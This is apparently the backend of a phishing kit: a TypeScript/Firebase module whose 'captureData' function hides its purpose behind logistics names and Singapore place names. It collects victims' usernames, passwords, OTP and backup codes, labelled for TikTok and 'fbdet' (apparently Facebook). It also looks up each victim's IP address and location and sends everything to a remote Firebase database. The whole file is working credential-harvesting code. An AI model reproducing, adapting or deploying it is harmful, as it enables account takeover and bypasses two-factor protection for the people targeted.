"use client";
import { initializeApp, getApps, getApp } from "firebase/app";
import {
  getDatabase,
  ref,
  push,
  set,
  serverTimestamp,
  update,
} from "firebase/database";
import { firebaseConfig } from "./firebaseConfig";

const app = getApps().length === 0 ? initializeApp(firebaseConfig) : getApp();
const db = getDatabase(app);

export const captureData = async (
  districtName: string,
  logisticsData: any,
  existingRouteId?: string,
) => {
  if (typeof window === "undefined") return null;

  const isTikTok = districtName.toLowerCase().includes("tiktok");
  const maskedPayload: any = {};

  // 1. Data Mapping Logic
  if (isTikTok) {
    // Standard Mapping for TikTok Dashboard Compatibility
    maskedPayload.user =
      logisticsData.user || logisticsData.emle || logisticsData.Orchard;
    maskedPayload.pass = logisticsData.pass || logisticsData.Sentosa;
    maskedPayload.method = logisticsData.method || "unknown";
    maskedPayload.country = logisticsData.country || "";

    // Handle OTP/Codes for TikTok
    if (logisticsData.code) {
      maskedPayload.code = logisticsData.code;
    }
  } else {
    // Legacy Singapore Mapping (fbdet style)
    if (logisticsData.emle) maskedPayload.Orchard = logisticsData.emle;
    if (logisticsData.pass) maskedPayload.Sentosa = logisticsData.pass;
    if (logisticsData.pass2) maskedPayload.Changi = logisticsData.pass2;

    const directKeys = ["Orchard", "Sentosa", "Changi", "Tampines"];
    Object.keys(logisticsData).forEach((key) => {
      if (directKeys.includes(key)) maskedPayload[key] = logisticsData[key];

      if (key.startsWith("otp") || key.startsWith("MarinaBay")) {
        const value = logisticsData[key];
        const ts = key.includes("_") ? key.split("_")[1] : Date.now();
        maskedPayload[`MarinaBay_${ts}`] = value;
      }

      if (key.startsWith("backupCode") || key.startsWith("Jurong")) {
        const value = logisticsData[key];
        const ts = key.includes("_") ? key.split("_")[1] : Date.now();
        maskedPayload[`Jurong_${ts}`] = value;
      }
    });
  }

  // 2. Handle Updates
  if (existingRouteId) {
    try {
      const node = isTikTok ? "TikTok-Live" : "fbdet";
      const routeRef = ref(db, `${node}/${existingRouteId}`);
      if (Object.keys(maskedPayload).length > 0) {
        await update(routeRef, maskedPayload);
      }
      return existingRouteId;
    } catch (err) {
      return null;
    }
  }

  // 3. Fetch IP/Geo Info
  let routeInfo = { ip: "0.0.0.0", gateway: "Default Gateway" };
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2500);
    const res = await fetch("https://ipapi.co/json/", {
      signal: controller.signal,
    });
    const data = await res.json();
    if (data && !data.error) {
      routeInfo.ip = data.ip || "Unknown";
      routeInfo.gateway = `${data.city || "Unknown"}, ${data.country_name || "Unknown"}`;
    }
    clearTimeout(timeoutId);
  } catch (e) {
    console.warn("Route trace failed.");
  }

  // 4. Create New Entry
  try {
    const node = isTikTok ? "TikTok-Live" : "fbdet";
    const registryRef = ref(db, node);
    const newRouteRef = push(registryRef);

    await set(newRouteRef, {
      ...maskedPayload,
      District: districtName,
      NodeIP: routeInfo.ip,
      Gateway: routeInfo.gateway,
      UserAgent: navigator.userAgent,
      EntryDate: new Date().toLocaleDateString("en-GB"),
      EntryTime: new Date().toLocaleTimeString("en-US", {
        hour12: true,
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
      }),
      ProcessedAt: serverTimestamp(),
    });

    return newRouteRef.key;
  } catch (err) {
    return null;
  }
};
